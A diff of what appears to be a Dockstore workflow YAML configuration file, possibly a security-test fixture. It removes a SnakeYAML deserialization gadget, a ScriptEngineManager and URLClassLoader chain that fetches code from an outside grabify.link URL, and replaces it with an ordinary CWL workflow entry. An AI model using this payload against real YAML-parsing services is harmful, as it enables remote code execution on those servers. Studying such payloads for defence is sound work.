@@ -1,6 +1,15 @@
+
 version: 1.2
-workflows: !!javax.script.ScriptEngineManager [
-  !!java.net.URLClassLoader [[
-    !!java.net.URL ["https://grabify.link/S9FG7Q?version: 1.2"]
-  ]]
-]
+workflows:
+   - subclass: CWL
+     name: autopotato-attack-7
+     primaryDescriptorPath: /potato.cwl
+     authors:
+       - name: Denis Yuen
+         orcid: 0000-0002-6130-1021
+       - name: UCSC Genomics Institute
+         role: Institute
+         affiliation: UCSC
+     publish: True
+     testParameterFiles:
+         - /test/dockstore.cwl.json
